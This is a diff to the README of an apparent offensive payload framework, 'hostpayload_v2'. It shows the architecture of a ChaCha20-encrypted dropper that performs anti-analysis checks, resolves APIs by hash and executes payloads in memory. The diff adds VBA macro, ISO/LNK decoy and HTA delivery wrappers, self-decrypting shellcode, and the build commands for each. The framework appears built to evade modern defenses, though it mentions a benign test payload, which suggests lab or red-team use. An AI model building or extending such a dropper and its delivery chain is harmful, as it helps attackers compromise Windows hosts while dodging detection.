@@ -48,12 +48,13 @@ framework that modern defenses catch reliably:
         +--> encrypted payload blob (ChaCha20 + HMAC-SHA256)
         +--> dropper.c              (C template with embedded or staged blob)
         +--> dropper.exe            (MinGW cross-compile, optional)
-        +--> delivery wrapper       (HTA, VBA macro, ISO/LNK — future)
+        +--> delivery wrapper       (HTA, VBA macro, ISO/LNK)
+        +--> self-decrypting shellcode (PIC, no EXE on disk)
 
 [ target Windows host ]
         |
         v
-   dropper.exe runs
+   dropper.exe / macro / ISO / shellcode runs
    - anti-analysis check (quiet exit)
    - PEB walk resolves WinHttp*, kernel32, ntdll APIs by hash
    - (embed mode) copy encrypted payload from .rdata
@@ -61,7 +62,7 @@ framework that modern defenses catch reliably:
    - verify HMAC-SHA256 over ciphertext
    - ChaCha20 decrypt in place
    - NtAllocateVirtualMemory RW -> copy -> NtProtectVirtualMemory RX
-   - NtCreateThreadEx execution
+   - execute decrypted payload
 ```
 
 ---
@@ -81,6 +82,15 @@ hostpayload_v2/
     test_crypto.py          ChaCha20 + HMAC roundtrip tests
   delivery/
     hta.py                  HTA wrapper generator
+    vba.py                  VBA macro dropper wrapper
+    iso_lnk.py              ISO + LNK wrapper generator
+  scripts/
+    build.py                standalone MinGW compile helper
+    validate.py             static scan for signatures and bad patterns
+    sc.py                   self-decrypting x64 PIC shellcode generator
+  tests/
+    test_crypto.py          ChaCha20 + HMAC roundtrip tests
+    test_benign.py          benign 3-byte payload generator for VM tests
   build/                    generated output (ignored by git)
 ```
 
@@ -123,6 +133,18 @@ python3 scripts/build.py --output dropper.exe dropper.c
 
 # Wrap a small staged dropper in an HTA file
 python3 delivery/hta.py --dropper dropper.exe --output run.hta
+
+# VBA macro that base64-decodes a tiny dropper and runs it
+python3 delivery/vba.py --dropper dropper.c --output run.vba
+
+# ISO + LNK tree (dropper + decoy README); burn with mkisofs
+python3 delivery/iso_lnk.py --dropper dropper.c --output payload_tree
+mkisofs -o payload.iso -J -R payload_tree
+
+# Self-decrypting x64 PIC shellcode (no EXE on disk)
+python3 tests/test_benign.py --output tests/benign.x64.bin
+python3 scripts/sc.py --payload tests/benign.x64.bin --output sc.bin
+python3 scripts/sc.py --payload tests/benign.x64.bin --output sc.py --format py
 ```
 
 Use `--keep-source` to also keep the generated `dropper.c` next to the EXE.
@@ -217,6 +239,7 @@ packer/dropper changed.
 - [x] Crypto unit tests (`tests/test_crypto.py`)
 - [x] Build regression script (`scripts/build_all.py`)
 - [x] Benign test payload (`tests/test_benign.py`)
+- [x] VBA macro delivery wrapper (`delivery/vba.py`)
+- [x] ISO/LNK delivery wrapper (`delivery/iso_lnk.py`)
+- [x] Self-decrypting shellcode variant (`scripts/sc.py`)
 - [ ] Environmental or target-specific key derivation
-- [ ] VBA macro / ISO-LNK delivery wrappers
-- [ ] Self-decrypting shellcode variant (no EXE on disk)
